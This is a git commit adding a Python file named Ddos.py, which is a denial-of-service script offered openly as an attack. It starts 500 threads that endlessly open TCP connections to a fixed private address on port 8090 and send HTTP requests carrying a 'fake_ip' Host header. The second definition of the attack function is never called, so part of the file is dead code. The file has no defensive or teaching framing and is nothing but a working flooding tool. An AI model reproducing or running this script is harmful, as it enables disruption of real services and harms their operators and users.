ebc52f5e2fedc2530a1a43fdb63b36f7fe64bcb3
flyingculprit <suryan2021ai@gmail.com>
2023-12-21 12:09:44 +0530

    The code for Ddos attack created

---
+++ Ddos.py
@@ -0,0 +1,30 @@
+import socket
+import threading
+target = '192.168.30.1'
+fake_ip = '182.21.20.32'
+port = 8090
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
+attack_num = 50000
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
+        s.close()
